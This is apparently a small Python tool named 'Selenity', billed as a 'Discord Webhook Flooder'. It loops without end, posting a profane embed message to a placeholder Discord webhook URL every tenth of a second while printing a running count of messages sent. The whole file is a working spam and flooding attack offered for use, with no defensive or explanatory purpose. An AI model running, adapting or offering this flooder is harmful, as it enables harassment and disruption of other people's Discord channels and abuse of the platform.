import os, random, sys, threading, colorama, sty, time
from discordwebhook import Discord
from colorama import Fore
from colorama import Style
colorama.init()

sent = 0
hook ='webhook-url-here'

plus_brkt = (Style.BRIGHT + Fore.LIGHTMAGENTA_EX + '[' + Style.BRIGHT + Fore.CYAN + '+' + Style.BRIGHT + Fore.LIGHTMAGENTA_EX + ']' + Fore.RESET)
minus_brkt = (Style.BRIGHT + Fore.LIGHTMAGENTA_EX + '[' + Style.BRIGHT + Fore.CYAN + '-' + Style.BRIGHT + Fore.LIGHTMAGENTA_EX + ']' + Fore.RESET)
error_brkt = (Style.BRIGHT + Fore.RED + '[' + Style.BRIGHT + Fore.YELLOW + '!' + Style.BRIGHT + Fore.RED + ']' + Fore.RESET)
info_brkt = (Style.BRIGHT + Fore.CYAN + '[' + Style.BRIGHT + Fore.YELLOW + '?' + Style.BRIGHT + Fore.CYAN + ']' + Fore.RESET)
name = (Style.BRIGHT + Fore.CYAN + 'Sel' + Fore.LIGHTMAGENTA_EX + 'en' + Fore.RED + 'ity' + Fore.RESET)


print('\n ', plus_brkt + ' Welcome To ', name, '| Leading', Fore.RED + Style.BRIGHT + 'Discord Webhook Flooder\n\n' + Fore.RESET)
while True:
    time.sleep( 0.1 )
    sent = sent + 1
    print(' ', plus_brkt, 'Sent', sent)
    discord = Discord(url=hook)
    discord.post(
    embeds=[{"title": "Selenity | Webhook Fucker", "description": "mmmmmmm fuck this webhook tastes good"}],
)